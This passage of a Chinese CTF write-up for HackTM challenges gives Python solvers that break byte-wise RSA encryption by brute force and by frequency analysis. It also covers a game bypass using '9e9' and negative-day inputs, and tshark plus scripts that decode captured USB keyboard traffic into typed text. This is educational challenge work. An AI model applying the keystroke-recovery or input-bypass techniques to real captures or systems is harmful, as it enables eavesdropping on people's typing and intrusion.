class="number">14296542628093736444815382636071360035549021313467366701986569710120268508807886041986007828960248665683292143486565404978073122476968882030310174125355932205646388813061197657253533595700948593692407928813318978600474254105007396254987998953819782624738628334271910759242195864082910860797444993756044746481</span>, <span class="number">20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477</span>, <span class="number">7983594351048693624291138893287137601848867970873700373034058935656045095987011116108642350616654713531373295621458596238107660073931212524833777531450461876588350132328332972361857441613098452082271331281504722310376573085001395356078670960667878342134517577992585442881605030717788248137764480486762452442</span>, <span class="number">7983594351048693624291138893287137601848867970873700373034058935656045095987011116108642350616654713531373295621458596238107660073931212524833777531450461876588350132328332972361857441613098452082271331281504722310376573085001395356078670960667878342134517577992585442881605030717788248137764480486762452442</span>, <span class="number">23267174349531278768420819619439317179083929128083924515569762521057285892931325108327037262091624670335579302436476096123152288550738706103166820604983405317430467198343871458522070337902643863890959573514405066297449924638838605501211486861582957963752388608487593217237563529201436917108304692859773404548</span>]</span><br></pre></td></tr></table></figure>
<p>易知，该文件提供了RSA的公钥：(e,n)，以及加密后的flag，我们发现，flag的密文是多个大数，可知是逐字节对flag进行加密的，那么进行简单的爆破即可解密。</p>
<p>再来看看<code>rsa.py</code>的内容：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> my_math <span class="keyword">import</span> next_prime</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    x, y, u, v = <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> a != <span class="number">0</span>:</span><br><span class="line">        q, r = b//a, b % a</span><br><span class="line">        m, n = x-u*q, y-v*q</span><br><span class="line">        b, a, x, y, u, v = a, r, u, v, m, n</span><br><span class="line">        gcd = b</span><br><span class="line">    <span class="keyword">return</span> gcd, x, y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_keys</span><span class="params">(p, q)</span>:</span></span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    gcd, d, b = egcd(e, phi)</span><br><span class="line">    <span class="comment"># Keys:((pub),  (priv))</span></span><br><span class="line">    <span class="keyword">return</span> ((e, n), (d, n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(key, p)</span>:</span></span><br><span class="line">    e, n = key</span><br><span class="line">    cipher = [pow(ord(char), e, n) <span class="keyword">for</span> char <span class="keyword">in</span> p]</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(pk, c)</span>:</span></span><br><span class="line">    key, n = pk</span><br><span class="line">    plain = [chr(pow(char, key, n)) <span class="keyword">for</span> char <span class="keyword">in</span> c]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(plain)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = next_prime(random.SystemRandom().getrandbits(<span class="number">512</span>))</span><br><span class="line">q = next_prime(random.SystemRandom().getrandbits(<span class="number">512</span>))</span><br><span class="line"></span><br><span class="line">flag_key=gen_keys(p, q)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Public key:"</span>)</span><br><span class="line">print(flag_key[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">flag_c=(enc(flag_key[<span class="number">0</span>], flag))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Encrypted flag:"</span>)</span><br><span class="line">print(flag_c)</span><br></pre></td></tr></table></figure>
<p>该脚本中是一些RSA的加密、解密函数，其中提供了p和q都是512bit的素数，因此模数n是1024bit的，打消分解n的念头（这里不得不说一下，有些比赛的1024bit以上的模数n在<a href="http://factordb.com/">http://factordb.com/</a> 上是有上传的，有时候可以先拿去分解试试）<br>我们从<code>enc</code>函数的加密机制发现，它是对明文进行逐字符进行加密，再次印证了是逐字节爆破，直接爆破flag即可。</p>
<h4 id="解密代码"><a href="#解密代码" class="headerlink" title="解密代码"></a>解密代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'c'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read().split(<span class="string">'\n'</span>)</span><br><span class="line">    e = int(data[<span class="number">1</span>].split(<span class="string">', '</span>)[<span class="number">0</span>][<span class="number">1</span>:])</span><br><span class="line">    n = int(data[<span class="number">1</span>].split(<span class="string">', '</span>)[<span class="number">1</span>][:<span class="number">-1</span>])</span><br><span class="line">    flag_enc = [int(x) <span class="keyword">for</span> x <span class="keyword">in</span> data[<span class="number">4</span>][<span class="number">1</span>:<span class="number">-1</span>].split(<span class="string">', '</span>)]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> flag_enc:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="keyword">if</span> pow(ord(c), e, n) == f:</span><br><span class="line">            flag += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<h3 id="RSA-2"><a href="#RSA-2" class="headerlink" title="RSA#2"></a>RSA#2</h3><h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h4><p>与上个题目一样，附件中包含两个文件<code>c</code>、<code>rsa.py</code>，并且<code>rsa.py</code>与上题一样：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> my_math <span class="keyword">import</span> next_prime</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    x, y, u, v = <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> a != <span class="number">0</span>:</span><br><span class="line">        q, r = b//a, b % a</span><br><span class="line">        m, n = x-u*q, y-v*q</span><br><span class="line">        b, a, x, y, u, v = a, r, u, v, m, n</span><br><span class="line">        gcd = b</span><br><span class="line">    <span class="keyword">return</span> gcd, x, y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_keys</span><span class="params">(p, q)</span>:</span></span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    gcd, d, b = egcd(e, phi)</span><br><span class="line">    <span class="comment"># Keys:((pub),  (priv))</span></span><br><span class="line">    <span class="keyword">return</span> ((e, n), (d, n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(key, p)</span>:</span></span><br><span class="line">    e, n = key</span><br><span class="line">    cipher = [pow(ord(char), e, n) <span class="keyword">for</span> char <span class="keyword">in</span> p]</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(pk, c)</span>:</span></span><br><span class="line">    key, n = pk</span><br><span class="line">    plain = [chr(pow(char, key, n)) <span class="keyword">for</span> char <span class="keyword">in</span> c]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(plain)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = next_prime(random.SystemRandom().getrandbits(<span class="number">512</span>))</span><br><span class="line">q = next_prime(random.SystemRandom().getrandbits(<span class="number">512</span>))</span><br><span class="line"></span><br><span class="line">flag_key=gen_keys(p, q)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Public key:"</span>)</span><br><span class="line">print(flag_key[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">flag_c=(enc(flag_key[<span class="number">0</span>], flag))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Encrypted flag:"</span>)</span><br><span class="line">print(flag_c)</span><br></pre></td></tr></table></figure>
<p>但是密文文件<code>c</code>内容不同，其中给出了逐字节加密的密文列表，但是并未给出公钥：</p>
<figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Public</span> key:</span><br><span class="line"><span class="meta">[</span><span class="built_in">DATA</span> CORRUPTED<span class="meta">]</span></span><br><span class="line"></span><br><span class="line">Encrypted flag:</span><br><span class="line"><span class="meta">[</span><span class="number">34220770932871364013976724839545041417474666615300575941746695940071552482886462087439379719184240006479394129946558717984964307444237521284361087031583504037093765914149168694482266218524635203263596760639253965500892625668716519628460563860957678979373258071483670494006067028836185890388591731283716604832</span></span><br><span class="line"><span class="params">...</span><span class="meta">]</span></span><br><span class="line">这里列表中共有1111个字符的密文</span><br></pre></td></tr></table></figure>
<p>没有公钥，怎么解密？？？显然也不是攻击私钥，而是直接对密文进行攻击。<br>我们看到，密文列表中有1111个密文，一般的flag不可能这么长，而这里给出了这么多密文，并且没有给出公钥，解密思路便很显然：<strong>利用字母频率攻击出明文</strong>。<br>这也是密码学常用的攻击方法之一，主要思路是：英文的字母在使用中出现的次数大致满足了一个频率表(参考<a href="https://en.wikipedia.org/wiki/Letter_frequency">https://en.wikipedia.org/wiki/Letter_frequency</a> )，我们可以把这1111个密文的出现频率统计出来，然后与字母频率对应，从而攻击出明文。</p>
<h4 id="解密代码-1"><a href="#解密代码-1" class="headerlink" title="解密代码"></a>解密代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'c'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read().split(<span class="string">'\n'</span>)</span><br><span class="line">    flag_enc = [int(x) <span class="keyword">for</span> x <span class="keyword">in</span> data[<span class="number">4</span>][<span class="number">1</span>:<span class="number">-1</span>].split(<span class="string">', '</span>)]</span><br><span class="line"></span><br><span class="line">freq_dict = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> flag_enc:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> f <span class="keyword">in</span> freq_dict:</span><br><span class="line">        freq_dict[f] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        freq_dict[f] += <span class="number">1</span></span><br><span class="line">freq = sorted(list(freq_dict.items()), key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line">freq.reverse()</span><br><span class="line"></span><br><span class="line">english_freq = [<span class="string">' '</span>, <span class="string">'E'</span>,<span class="string">'T'</span>,<span class="string">'A'</span>,<span class="string">'I'</span>,<span class="string">'N'</span>,<span class="string">'O'</span>,<span class="string">'R'</span>,<span class="string">'S'</span>,<span class="string">'L'</span>,<span class="string">'H'</span>,</span><br><span class="line">                <span class="string">'C'</span>,<span class="string">'M'</span>,<span class="string">'D'</span>,<span class="string">'Y'</span>,<span class="string">'P'</span>,<span class="string">'U'</span>,<span class="string">'W'</span>,<span class="string">'F'</span>,<span class="string">'G'</span>,<span class="string">'.'</span>,<span class="string">'V'</span>,</span><br><span class="line">                <span class="string">'B'</span>,<span class="string">'X'</span>,<span class="string">'K'</span>,<span class="string">','</span>,<span class="string">'Q'</span>, <span class="string">'Z'</span>, <span class="string">'\''</span>, <span class="string">'0'</span>, <span class="string">'9'</span>]</span><br><span class="line">translator = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> enumerate(english_freq):</span><br><span class="line">    translator[freq[i][<span class="number">0</span>]] = c</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> flag_enc:</span><br><span class="line">    <span class="keyword">if</span> f <span class="keyword">in</span> translator:</span><br><span class="line">        print(translator[f], end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>

<h3 id="The-Dragon-Sleeps-At-Night"><a href="#The-Dragon-Sleeps-At-Night" class="headerlink" title="The Dragon Sleeps At Night"></a>The Dragon Sleeps At Night</h3><p>一道misc题，考脑洞，也考基本知识，多做misc确实能开眼界啊！</p>
<h4 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h4><p><code>netcat</code>连接目标IP之后进入一个游戏盒，秉承misc一大传统：打游戏。<br><img src="http://www.ggb0n.cool/images/HackTM-WP1.png" alt=""><br>这个题目是一个屠龙的游戏，从图中可以看到，有以下功能：<br>去商店：这里有从1级到5级的屠龙宝刀，屠龙！拿flag~<br>去工作：赚钱买刀！屠龙！拿flag~<br>去龙穴：屠龙！拿flag~<br>回家：休息，为了屠龙！拿flag~<br>储藏室：放宝刀</p>
<p>解题关键点：</p>
<ul>
<li>1、这里去工作的话最后拿工资的时候会让输入工作天数，1刀/天，但是每次之多输入三个字符，因此常数的话最多999…怎么办呢？</li>
<li>2、回家休息的时候可以输入休息的天数，但是休息会“降低”储藏室中宝刀的级别，1级/天，不过…休息天数正负不限~<br>这两点就是屠龙的关键。</li>
</ul>
<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>根据前面的分析，我们需要先去工作赚钱，在结账的时候输入<code>9e9</code>的话其实就可以得到9 billion刀，这足以买到5级宝刀了。其实就是利用科学计数法绕过限制，CTF中很多题目借用了这一点。<br>此时去屠龙的话，仍然会失败，因为需要6级宝刀，但是商店没有啊！利用关键点2，我们先买5级宝刀并放在储藏室，然后去睡<code>-1</code>天，便得到了一把6级宝刀，再去屠龙便能顺利拿到flag了。<br><img src="http://www.ggb0n.cool/images/HackTM-WP2.png" alt=""></p>
<h3 id="Strange-PCAP"><a href="#Strange-PCAP" class="headerlink" title="Strange PCAP"></a>Strange PCAP</h3><p>考察流量包隐写、usb数据分析</p>
<h4 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h4><p>下载数据包的时候，压缩工具就提示要输入密码，但是是个流量包，直接能打开，输密码干嘛？<br>用<code>binwalk</code>分析一下，发现存在压缩包隐写，<code>binwalk -e</code>提取<br><img src="http://www.ggb0n.cool/images/HackTM-WP100.png" alt=""><br>但是解压需要密码，那就看看数据包里的内容，发现是<code>usb</code>数据，估计就是键盘记录或者鼠标记录了<br><img src="http://www.ggb0n.cool/images/HackTM-WP99.png" alt=""><br>利用常规的方法：把<code>usb数据</code>提取出来，然后用现有的跑键盘记录的脚本跑出来即可。<br>先利用<a href="https://segmentfault.com/a/1190000018886363">tshark</a>提取数据：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">tshark -r Strange.pcapng -T fields -e usb.capdata | sed <span class="string">'/^\s*$/d'</span> &gt; usbdata.txt</span><br><span class="line"><span class="regexp">//</span>加上<span class="string">"| sed '/^\s*$/d'"</span>是因为直接提取的话会有很多空行，加上这一句空行就没了</span><br></pre></td></tr></table></figure>
<p>发现提取的数据如下：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000104000100000000000000</span></span><br><span class="line"><span class="number">0000000104000100000000000000000100000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="number">210008</span></span><br><span class="line"><span class="number">210010</span></span><br><span class="line"><span class="number">210012</span></span><br><span class="line"><span class="number">0000240000000000</span></span><br><span class="line"><span class="number">0000000000000000</span></span><br><span class="line"><span class="number">0000190000000000</span></span><br><span class="line"><span class="number">0000000000000000</span></span><br><span class="line"><span class="number">00000</span>a0000000000</span><br><span class="line"><span class="number">0000000000000000</span></span><br><span class="line"><span class="number">00000</span>d0000000000</span><br><span class="line"><span class="number">0000000000000000</span></span><br><span class="line"><span class="number">0000210000000000</span></span><br><span class="line"><span class="number">0000000000000000</span></span><br><span class="line"><span class="number">0200000000000000</span></span><br><span class="line"><span class="number">0200160000000000</span></span><br><span class="line"><span class="number">0200000000000000</span></span><br><span class="line"><span class="number">0200160000000000</span></span><br><span class="line"><span class="number">0200000000000000</span></span><br><span class="line"><span class="number">0000000000000000</span></span><br><span class="line"><span class="number">2000000000000000</span></span><br><span class="line"><span class="number">20000f</span>0000000000</span><br><span class="line"><span class="number">0000000000000000</span></span><br><span class="line"><span class="number">0000260000000000</span></span><br><span class="line"><span class="number">0000000000000000</span></span><br><span class="line"><span class="number">2000000000000000</span></span><br><span class="line"><span class="number">2000110000000000</span></span><br><span class="line"><span class="number">2000000000000000</span></span><br><span class="line"><span class="number">0000000000000000</span></span><br><span class="line"><span class="number">2000000000000000</span></span><br><span class="line"><span class="number">20000</span>b0000000000</span><br><span class="line"><span class="number">2000000000000000</span></span><br><span class="line"><span class="number">0000000000000000</span></span><br><span class="line"><span class="number">2000000000000000</span></span><br><span class="line"><span class="number">2000190000000000</span></span><br><span class="line"><span class="number">2000000000000000</span></span><br><span class="line"><span class="number">0000000000000000</span></span><br><span class="line"><span class="number">0000180000000000</span></span><br><span class="line"><span class="number">0000000000000000</span></span><br><span class="line"><span class="number">0200000000000000</span></span><br><span class="line"><span class="number">02000e0000000000</span></span><br><span class="line"><span class="number">0200000000000000</span></span><br><span class="line"><span class="number">0000000000000000</span></span><br><span class="line"><span class="number">0000270000000000</span></span><br><span class="line"><span class="number">0000000000000000</span></span><br><span class="line"><span class="number">0200000000000000</span></span><br><span class="line"><span class="number">0200070000000000</span></span><br><span class="line"><span class="number">0200000000000000</span></span><br><span class="line"><span class="number">0000000000000000</span></span><br><span class="line"><span class="number">0000230000000000</span></span><br><span class="line"><span class="number">0000000000000000</span></span><br><span class="line"><span class="number">0000070000000000</span></span><br><span class="line"><span class="number">0000000000000000</span></span><br><span class="line"><span class="number">0000200000000000</span></span><br><span class="line"><span class="number">0000000000000000</span></span><br><span class="line"><span class="number">0200000000000000</span></span><br><span class="line"><span class="number">0200090000000000</span></span><br><span class="line"><span class="number">0200000000000000</span></span><br><span class="line"><span class="number">0000000000000000</span></span><br><span class="line"><span class="number">0000280000000000</span></span><br><span class="line"><span class="number">0000000000000000</span></span><br><span class="line"><span class="number">210010</span></span><br></pre></td></tr></table></figure>
<p>直接用脚本跑键盘记录的话，结果如下：<br><img src="http://www.ggb0n.cool/images/HackTM-WP102.png" alt=""><br>可以看到结果不正常，因为上面的数据有很多冗余数据(长度不是8字节的部分)，去掉之后再跑脚本，结果如下：<br><img src="http://www.ggb0n.cool/images/HackTM-WP103.png" alt=""><br>输入密码，即可拿到flag：<br><img src="http://www.ggb0n.cool/images/HackTM-WP104.png" alt=""></p>
<h4 id="键盘记录脚本"><a href="#键盘记录脚本" class="headerlink" title="键盘记录脚本"></a>键盘记录脚本</h4><p>本题用国内的通用脚本解不出来，用国外wp的脚本可以</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#经夏风师傅完善过的国外脚本</span></span><br><span class="line">usb_codes = &#123;</span><br><span class="line">    <span class="number">0x04</span>:<span class="string">"aA"</span>, <span class="number">0x05</span>:<span class="string">"bB"</span>, <span class="number">0x06</span>:<span class="string">"cC"</span>, <span class="number">0x07</span>:<span class="string">"dD"</span>, <span class="number">0x08</span>:<span class="string">"eE"</span>, <span class="number">0x09</span>:<span class="string">"fF"</span>,</span><br><span class="line">    <span class="number">0x0A</span>:<span class="string">"gG"</span>, <span class="number">0x0B</span>:<span class="string">"hH"</span>, <span class="number">0x0C</span>:<span class="string">"iI"</span>, <span class="number">0x0D</span>:<span class="string">"jJ"</span>, <span class="number">0x0E</span>:<span class="string">"kK"</span>, <span class="number">0x0F</span>:<span class="string">"lL"</span>,</span><br><span class="line">    <span class="number">0x10</span>:<span class="string">"mM"</span>, <span class="number">0x11</span>:<span class="string">"nN"</span>, <span class="number">0x12</span>:<span class="string">"oO"</span>, <span class="number">0x13</span>:<span class="string">"pP"</span>, <span class="number">0x14</span>:<span class="string">"qQ"</span>, <span class="number">0x15</span>:<span class="string">"rR"</span>,</span><br><span class="line">    <span class="number">0x16</span>:<span class="string">"sS"</span>, <span class="number">0x17</span>:<span class="string">"tT"</span>, <span class="number">0x18</span>:<span class="string">"uU"</span>, <span class="number">0x19</span>:<span class="string">"vV"</span>, <span class="number">0x1A</span>:<span class="string">"wW"</span>, <span class="number">0x1B</span>:<span class="string">"xX"</span>,</span><br><span class="line">    <span class="number">0x1C</span>:<span class="string">"yY"</span>, <span class="number">0x1D</span>:<span class="string">"zZ"</span>, <span class="number">0x1E</span>:<span class="string">"1!"</span>, <span class="number">0x1F</span>:<span class="string">"2@"</span>, <span class="number">0x20</span>:<span class="string">"3#"</span>, <span class="number">0x21</span>:<span class="string">"4$"</span>,</span><br><span class="line">    <span class="number">0x22</span>:<span class="string">"5%"</span>, <span class="number">0x23</span>:<span class="string">"6^"</span>, <span class="number">0x24</span>:<span class="string">"7&amp;"</span>, <span class="number">0x25</span>:<span class="string">"8*"</span>, <span class="number">0x26</span>:<span class="string">"9("</span>, <span class="number">0x27</span>:<span class="string">"0)"</span>,</span><br><span class="line">    <span class="number">0x2C</span>:<span class="string">"  "</span>, <span class="number">0x2D</span>:<span class="string">"-_"</span>, <span class="number">0x2E</span>:<span class="string">"=+"</span>, <span class="number">0x2F</span>:<span class="string">"[&#123;"</span>, <span class="number">0x30</span>:<span class="string">"]&#125;"</span>,  <span class="number">0x32</span>:<span class="string">"#~"</span>,</span><br><span class="line">    <span class="number">0x33</span>:<span class="string">";:"</span>, <span class="number">0x34</span>:<span class="string">"'\""</span>,  <span class="number">0x36</span>:<span class="string">",&lt;"</span>,  <span class="number">0x37</span>:<span class="string">".&gt;"</span>,   <span class="number">0x38</span>:<span class="string">"/?"</span>,  <span class="number">0x39</span>:<span class="string">"&lt;CAP&gt;&lt;CAP&gt;"</span>,</span><br><span class="line">    <span class="number">0x3a</span>:<span class="string">"&lt;F1&gt;&lt;F1&gt;"</span>, <span class="number">0x3b</span>:<span class="string">"&lt;F4&gt;&lt;F4&gt;"</span>, <span class="number">0x3e</span>:<span class="string">"&lt;F5&gt;&lt;F5&gt;"</span>,<span class="number">0x3f</span>:<span class="string">"&lt;F6&gt;&lt;F6&gt;"</span>,</span><br><span class="line">    <span class="number">0x40</span>:<span class="string">"&lt;F7&gt;&lt;F7&gt;"</span>,<span class="number">0x41</span>:<span class="string">"&lt;F8&gt;&lt;F8&gt;"</span>,<span class="number">0x42</span>:<span class="string">"&lt;F9&gt;&lt;F9&gt;"</span>,<span class="number">0x43</span>:<span class="string">"&lt;F10&gt;&lt;F10&gt;"</span>,</span><br><span class="line">    <span class="number">0x44</span>:<span class="string">"&lt;F11&gt;&lt;F11&gt;"</span>,<span class="number">0x45</span>:<span class="string">"&lt;F12&gt;&lt;F12&gt;"</span></span><br><span class="line">&#125;</span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> open(<span class="string">"usb.txt"</span>,<span class="string">"r"</span>).readlines():</span><br><span class="line">    code = int(x[<span class="number">4</span>:<span class="number">6</span>],<span class="number">16</span>)</span><br><span class="line">    print(x[<span class="number">4</span>:<span class="number">6</span>])</span><br><span class="line">    <span class="keyword">if</span> code == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> code == <span class="number">0x28</span>:</span><br><span class="line">        print(<span class="string">'ENTER!'</span>)</span><br><span class="line">        print(data)</span><br><span class="line">        data = <span class="string">''</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    upper = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> int(x[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>) == <span class="number">0x02</span> <span class="keyword">or</span> int(x[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>) == <span class="number">0x20</span>:</span><br><span class="line">        upper = <span class="number">1</span></span><br><span class="line">    data += usb_codes[code][upper]</span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>
<p>再附一个国内的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">normalKeys = &#123;</span><br><span class="line">    <span class="string">"04"</span>:<span class="string">"a"</span>, <span class="string">"05"</span>:<span class="string">"b"</span>, <span class="string">"06"</span>:<span class="string">"c"</span>, <span class="string">"07"</span>:<span class="string">"d"</span>, <span class="string">"08"</span>:<span class="string">"e"</span>,</span><br><span class="line">    <span class="string">"09"</span>:<span class="string">"f"</span>, <span class="string">"0a"</span>:<span class="string">"g"</span>, <span class="string">"0b"</span>:<span class="string">"h"</span>, <span class="string">"0c"</span>:<span class="string">"i"</span>, <span class="string">"0d"</span>:<span class="string">"j"</span>,</span><br><span class="line">     <span class="string">"0e"</span>:<span class="string">"k"</span>, <span class="string">"0f"</span>:<span class="string">"l"</span>, <span class="string">"10"</span>:<span class="string">"m"</span>, <span class="string">"11"</span>:<span class="string">"n"</span>, <span class="string">"12"</span>:<span class="string">"o"</span>,</span><br><span class="line">      <span class="string">"13"</span>:<span class="string">"p"</span>, <span class="string">"14"</span>:<span class="string">"q"</span>, <span class="string">"15"</span>:<span class="string">"r"</span>, <span class="string">"16"</span>:<span class="string">"s"</span>, <span class="string">"17"</span>:<span class="string">"t"</span>,</span><br><span class="line">       <span class="string">"18"</span>:<span class="string">"u"</span>, <span class="string">"19"</span>:<span class="string">"v"</span>, <span class="string">"1a"</span>:<span class="string">"w"</span>, <span class="string">"1b"</span>:<span class="string">"x"</span>, <span class="string">"1c"</span>:<span class="string">"y"</span>,</span><br><span class="line">        <span class="string">"1d"</span>:<span class="string">"z"</span>,<span class="string">"1e"</span>:<span class="string">"1"</span>, <span class="string">"1f"</span>:<span class="string">"2"</span>, <span class="string">"20"</span>:<span class="string">"3"</span>, <span class="string">"21"</span>:<span class="string">"4"</span>,</span><br><span class="line">         <span class="string">"22"</span>:<span class="string">"5"</span>, <span class="string">"23"</span>:<span class="string">"6"</span>,<span class="string">"24"</span>:<span class="string">"7"</span>,<span class="string">"25"</span>:<span class="string">"8"</span>,<span class="string">"26"</span>:<span class="string">"9"</span>,</span><br><span class="line">         <span class="string">"27"</span>:<span class="string">"0"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,</span><br><span class="line">         <span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"-"</span>,<span class="string">"2e"</span>:<span class="string">"="</span>,<span class="string">"2f"</span>:<span class="string">"["</span>,<span class="string">"30"</span>:<span class="string">"]"</span>,<span class="string">"31"</span>:<span class="string">"\\"</span>,</span><br><span class="line">         <span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">";"</span>,<span class="string">"34"</span>:<span class="string">"'"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">","</span>,<span class="string">"37"</span>:<span class="string">"."</span>,</span><br><span class="line">         <span class="string">"38"</span>:<span class="string">"/"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,</span><br><span class="line">         <span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,</span><br><span class="line">         <span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line">shiftKeys = &#123;</span><br><span class="line">    <span class="string">"04"</span>:<span class="string">"A"</span>, <span class="string">"05"</span>:<span class="string">"B"</span>, <span class="string">"06"</span>:<span class="string">"C"</span>, <span class="string">"07"</span>:<span class="string">"D"</span>, <span class="string">"08"</span>:<span class="string">"E"</span>,</span><br><span class="line">     <span class="string">"09"</span>:<span class="string">"F"</span>, <span class="string">"0a"</span>:<span class="string">"G"</span>, <span class="string">"0b"</span>:<span class="string">"H"</span>, <span class="string">"0c"</span>:<span class="string">"I"</span>, <span class="string">"0d"</span>:<span class="string">"J"</span>,</span><br><span class="line">      <span class="string">"0e"</span>:<span class="string">"K"</span>, <span class="string">"0f"</span>:<span class="string">"L"</span>, <span class="string">"10"</span>:<span class="string">"M"</span>, <span class="string">"11"</span>:<span class="string">"N"</span>, <span class="string">"12"</span>:<span class="string">"O"</span>,</span><br><span class="line">       <span class="string">"13"</span>:<span class="string">"P"</span>, <span class="string">"14"</span>:<span class="string">"Q"</span>, <span class="string">"15"</span>:<span class="string">"R"</span>, <span class="string">"16"</span>:<span class="string">"S"</span>, <span 